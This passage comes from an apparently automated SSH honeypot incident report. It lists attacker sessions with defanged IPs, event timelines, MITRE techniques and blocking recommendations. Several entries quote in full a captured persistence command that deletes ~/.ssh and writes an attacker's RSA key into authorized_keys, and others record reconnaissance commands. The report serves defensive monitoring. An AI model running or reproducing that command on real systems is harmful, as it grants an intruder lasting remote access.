| `2026-06-30 15:50:42` | `cowrie.session.connect` |
| `2026-06-30 15:50:42` | `cowrie.client.version` |
| `2026-06-30 15:50:42` | `cowrie.client.kex` |
| `2026-06-30 15:50:42` | `cowrie.login.success` |
| `2026-06-30 15:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.60.88[.]74` to AbuseIPDB if not already reported
- [ ] Block `151.60.88[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18bd21c16e6b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.18[.]80` |
| **First Seen** | 2026-06-30 15:51 |
| **Last Seen** | 2026-06-30 15:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:51:13` | `cowrie.session.connect` |
| `2026-06-30 15:51:13` | `cowrie.client.version` |
| `2026-06-30 15:51:13` | `cowrie.client.kex` |
| `2026-06-30 15:51:14` | `cowrie.login.success` |
| `2026-06-30 15:51:15` | `cowrie.session.params` |
| `2026-06-30 15:51:15` | `cowrie.command.input` |
| `2026-06-30 15:51:15` | `cowrie.command.failed` |
| `2026-06-30 15:51:15` | `cowrie.log.closed` |
| `2026-06-30 15:51:16` | `cowrie.session.params` |
| `2026-06-30 15:51:16` | `cowrie.command.input` |
| `2026-06-30 15:51:16` | `cowrie.session.file_download` |
| `2026-06-30 15:51:16` | `cowrie.log.closed` |
| `2026-06-30 15:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.18[.]80` to AbuseIPDB if not already reported
- [ ] Block `139.59.18[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f9d7598668

| Field | Detail |
|---|---|
| **Source IP** | `139.59.18[.]80` |
| **First Seen** | 2026-06-30 15:51 |
| **Last Seen** | 2026-06-30 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:51:16` | `cowrie.session.connect` |
| `2026-06-30 15:51:16` | `cowrie.client.version` |
| `2026-06-30 15:51:17` | `cowrie.client.kex` |
| `2026-06-30 15:51:18` | `cowrie.login.success` |
| `2026-06-30 15:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.18[.]80` to AbuseIPDB if not already reported
- [ ] Block `139.59.18[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10f84df76d45

| Field | Detail |
|---|---|
| **Source IP** | `139.59.18[.]80` |
| **First Seen** | 2026-06-30 15:51 |
| **Last Seen** | 2026-06-30 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:51:18` | `cowrie.session.connect` |
| `2026-06-30 15:51:18` | `cowrie.client.version` |
| `2026-06-30 15:51:18` | `cowrie.client.kex` |
| `2026-06-30 15:51:19` | `cowrie.login.success` |
| `2026-06-30 15:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.18[.]80` to AbuseIPDB if not already reported
- [ ] Block `139.59.18[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24becec3daec

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 15:53 |
| **Last Seen** | 2026-06-30 15:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:53:18` | `cowrie.session.connect` |
| `2026-06-30 15:53:18` | `cowrie.client.version` |
| `2026-06-30 15:53:18` | `cowrie.client.kex` |
| `2026-06-30 15:53:20` | `cowrie.login.success` |
| `2026-06-30 15:53:22` | `cowrie.session.params` |
| `2026-06-30 15:53:22` | `cowrie.command.input` |
| `2026-06-30 15:53:23` | `cowrie.log.closed` |
| `2026-06-30 15:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-372112e0ed88

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]116` |
| **First Seen** | 2026-06-30 15:56 |
| **Last Seen** | 2026-06-30 15:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:56:51` | `cowrie.session.connect` |
| `2026-06-30 15:56:51` | `cowrie.client.version` |
| `2026-06-30 15:56:51` | `cowrie.client.kex` |
| `2026-06-30 15:56:52` | `cowrie.login.success` |
| `2026-06-30 15:56:53` | `cowrie.session.params` |
| `2026-06-30 15:56:53` | `cowrie.command.input` |
| `2026-06-30 15:56:53` | `cowrie.command.failed` |
| `2026-06-30 15:56:53` | `cowrie.log.closed` |
| `2026-06-30 15:56:54` | `cowrie.session.params` |
| `2026-06-30 15:56:54` | `cowrie.command.input` |
| `2026-06-30 15:56:55` | `cowrie.session.file_download` |
| `2026-06-30 15:56:55` | `cowrie.log.closed` |
| `2026-06-30 15:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]116` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f53c5b3fba

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]116` |
| **First Seen** | 2026-06-30 15:56 |
| **Last Seen** | 2026-06-30 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:56:57` | `cowrie.session.connect` |
| `2026-06-30 15:56:57` | `cowrie.client.version` |
| `2026-06-30 15:56:57` | `cowrie.client.kex` |
| `2026-06-30 15:56:58` | `cowrie.login.success` |
| `2026-06-30 15:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]116` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a1d83feef0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]116` |
| **First Seen** | 2026-06-30 15:56 |
| **Last Seen** | 2026-06-30 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:56:58` | `cowrie.session.connect` |
| `2026-06-30 15:56:58` | `cowrie.client.version` |
| `2026-06-30 15:56:58` | `cowrie.client.kex` |
| `2026-06-30 15:56:59` | `cowrie.login.success` |
| `2026-06-30 15:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]116` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646acdc2a74b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 15:57 |
| **Last Seen** | 2026-06-30 15:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:57:45` | `cowrie.session.connect` |
| `2026-06-30 15:57:45` | `cowrie.client.version` |
| `2026-06-30 15:57:47` | `cowrie.client.kex` |
| `2026-06-30 15:57:52` | `cowrie.login.success` |
| `2026-06-30 15:57:56` | `cowrie.session.params` |
| `2026-06-30 15:57:56` | `cowrie.command.input` |
| `2026-06-30 15:57:57` | `cowrie.log.closed` |
| `2026-06-30 15:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20270ed7b659

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 15:58 |
| **Last Seen** | 2026-06-30 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:58:15` | `cowrie.session.connect` |
| `2026-06-30 15:58:15` | `cowrie.client.version` |
| `2026-06-30 15:58:15` | `cowrie.client.kex` |
| `2026-06-30 15:58:16` | `cowrie.login.success` |
| `2026-06-30 15:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c05489b462

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 15:58 |
| **Last Seen** | 2026-06-30 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:58:15` | `cowrie.session.connect` |
| `2026-06-30 15:58:15` | `cowrie.client.version` |
| `2026-06-30 15:58:16` | `cowrie.client.kex` |
| `2026-06-30 15:58:16` | `cowrie.login.success` |
| `2026-06-30 15:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3930334e093

| Field | Detail |
|---|---|
| **Source IP** | `106.74.128[.]226` |
| **First Seen** | 2026-06-30 15:59 |
| **Last Seen** | 2026-06-30 15:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:59:15` | `cowrie.session.connect` |
| `2026-06-30 15:59:15` | `cowrie.client.version` |
| `2026-06-30 15:59:16` | `cowrie.client.kex` |
| `2026-06-30 15:59:18` | `cowrie.login.success` |
| `2026-06-30 15:59:19` | `cowrie.session.params` |
| `2026-06-30 15:59:19` | `cowrie.command.input` |
| `2026-06-30 15:59:20` | `cowrie.log.closed` |
| `2026-06-30 15:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.74.128[.]226` to AbuseIPDB if not already reported
- [ ] Block `106.74.128[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71bc2506ce8a

| Field | Detail |
|---|---|
| **Source IP** | `1.192.61[.]19` |
| **First Seen** | 2026-06-30 16:03 |
| **Last Seen** | 2026-06-30 16:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:03:29` | `cowrie.session.connect` |
| `2026-06-30 16:03:29` | `cowrie.client.version` |
| `2026-06-30 16:03:30` | `cowrie.client.kex` |
| `2026-06-30 16:03:31` | `cowrie.login.success` |
| `2026-06-30 16:03:32` | `cowrie.session.params` |
| `2026-06-30 16:03:32` | `cowrie.command.input` |
| `2026-06-30 16:03:32` | `cowrie.command.failed` |
| `2026-06-30 16:03:32` | `cowrie.log.closed` |
| `2026-06-30 16:03:33` | `cowrie.session.params` |
| `2026-06-30 16:03:33` | `cowrie.command.input` |
| `2026-06-30 16:03:34` | `cowrie.session.file_download` |
| `2026-06-30 16:03:34` | `cowrie.log.closed` |
| `2026-06-30 16:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.192.61[.]19` to AbuseIPDB if not already reported
- [ ] Block `1.192.61[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467892818005

| Field | Detail |
|---|---|
| **Source IP** | `1.192.61[.]19` |
| **First Seen** | 2026-06-30 16:03 |
| **Last Seen** | 2026-06-30 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:03:35` | `cowrie.session.connect` |
| `2026-06-30 16:03:35` | `cowrie.client.version` |
| `2026-06-30 16:03:35` | `cowrie.client.kex` |
| `2026-06-30 16:03:36` | `cowrie.login.success` |
| `2026-06-30 16:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.192.61[.]19` to AbuseIPDB if not already reported
- [ ] Block `1.192.61[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c1181e1e31

| Field | Detail |
|---|---|
| **Source IP** | `1.192.61[.]19` |
| **First Seen** | 2026-06-30 16:03 |
| **Last Seen** | 2026-06-30 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:03:37` | `cowrie.session.connect` |
| `2026-06-30 16:03:37` | `cowrie.client.version` |
| `2026-06-30 16:03:37` | `cowrie.client.kex` |
| `2026-06-30 16:03:38` | `cowrie.login.success` |
| `2026-06-30 16:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.192.61[.]19` to AbuseIPDB if not already reported
- [ ] Block `1.192.61[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5c1e250f32f

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-06-30 16:06 |
| **Last Seen** | 2026-06-30 16:11 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:06:18` | `cowrie.session.connect` |
| `2026-06-30 16:06:18` | `cowrie.client.version` |
| `2026-06-30 16:06:18` | `cowrie.client.kex` |
| `2026-06-30 16:06:19` | `cowrie.login.success` |
| `2026-06-30 16:06:20` | `cowrie.session.params` |
| `2026-06-30 16:06:20` | `cowrie.command.input` |
| `2026-06-30 16:06:20` | `cowrie.command.failed` |
| `2026-06-30 16:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390c25fd355b

| Field | Detail |
|---|---|
| **Source IP** | `51.91.157[.]92` |
| **First Seen** | 2026-06-30 16:08 |
| **Last Seen** | 2026-06-30 16:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:08:08` | `cowrie.session.connect` |
| `2026-06-30 16:08:08` | `cowrie.client.version` |
| `2026-06-30 16:08:08` | `cowrie.client.kex` |
| `2026-06-30 16:08:09` | `cowrie.login.success` |
| `2026-06-30 16:08:10` | `cowrie.session.params` |
| `2026-06-30 16:08:10` | `cowrie.command.input` |
| `2026-06-30 16:08:10` | `cowrie.command.failed` |
| `2026-06-30 16:08:10` | `cowrie.log.closed` |
| `2026-06-30 16:08:10` | `cowrie.session.params` |
| `2026-06-30 16:08:10` | `cowrie.command.input` |
| `2026-06-30 16:08:10` | `cowrie.session.file_download` |
| `2026-06-30 16:08:10` | `cowrie.log.closed` |
| `2026-06-30 16:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.157[.]92` to AbuseIPDB if not already reported
- [ ] Block `51.91.157[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb53afdba71a

| Field | Detail |
|---|---|
| **Source IP** | `51.91.157[.]92` |
| **First Seen** | 2026-06-30 16:08 |
| **Last Seen** | 2026-06-30 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:08:11` | `cowrie.session.connect` |
| `2026-06-30 16:08:11` | `cowrie.client.version` |
| `2026-06-30 16:08:11` | `cowrie.client.kex` |
| `2026-06-30 16:08:11` | `cowrie.login.success` |
| `2026-06-30 16:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.157[.]92` to AbuseIPDB if not already reported
- [ ] Block `51.91.157[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85fd42755ac

| Field | Detail |
|---|---|
| **Source IP** | `51.91.157[.]92` |
| **First Seen** | 2026-06-30 16:08 |
| **Last Seen** | 2026-06-30 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:08:11` | `cowrie.session.connect` |
| `2026-06-30 16:08:11` | `cowrie.client.version` |
| `2026-06-30 16:08:11` | `cowrie.client.kex` |
| `2026-06-30 16:08:12` | `cowrie.login.success` |
| `2026-06-30 16:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.157[.]92` to AbuseIPDB if not already reported
- [ ] Block `51.91.157[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de78299fd064

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 16:09 |
| **Last Seen** | 2026-06-30 16:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:09:34` | `cowrie.session.connect` |
| `2026-06-30 16:09:35` | `cowrie.client.version` |
| `2026-06-30 16:09:35` | `cowrie.client.kex` |
| `2026-06-30 16:09:41` | `cowrie.login.success` |
| `2026-06-30 16:09:44` | `cowrie.session.params` |
| `2026-06-30 16:09:44` | `cowrie.command.input` |
| `2026-06-30 16:09:46` | `cowrie.log.closed` |
| `2026-06-30 16:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f684ced722d

| Field | Detail |
|---|---|
| **Source IP** | `103.97.135[.]244` |
| **First Seen** | 2026-06-30 16:09 |
| **Last Seen** | 2026-06-30 16:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:09:43` | `cowrie.session.connect` |
| `2026-06-30 16:09:43` | `cowrie.client.version` |
| `2026-06-30 16:09:44` | `cowrie.client.kex` |
| `2026-06-30 16:09:45` | `cowrie.login.success` |
| `2026-06-30 16:09:46` | `cowrie.session.params` |
| `2026-06-30 16:09:46` | `cowrie.command.input` |
| `2026-06-30 16:09:46` | `cowrie.command.failed` |
| `2026-06-30 16:09:46` | `cowrie.log.closed` |
| `2026-06-30 16:09:47` | `cowrie.session.params` |
| `2026-06-30 16:09:47` | `cowrie.command.input` |
| `2026-06-30 16:09:48` | `cowrie.session.file_download` |
| `2026-06-30 16:09:48` | `cowrie.log.closed` |
| `2026-06-30 16:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.135[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.97.135[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c08a834339

| Field | Detail |
|---|---|
| **Source IP** | `103.97.135[.]244` |
| **First Seen** | 2026-06-30 16:09 |
| **Last Seen** | 2026-06-30 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:09:48` | `cowrie.session.connect` |
| `2026-06-30 16:09:48` | `cowrie.client.version` |
| `2026-06-30 16:09:48` | `cowrie.client.kex` |
| `2026-06-30 16:09:49` | `cowrie.login.success` |
| `2026-06-30 16:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.135[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.97.135[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aef0d204b7c

| Field | Detail |
|---|---|
| **Source IP** | `103.97.135[.]244` |
| **First Seen** | 2026-06-30 16:09 |
| **Last Seen** | 2026-06-30 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:09:50` | `cowrie.session.connect` |
| `2026-06-30 16:09:50` | `cowrie.client.version` |
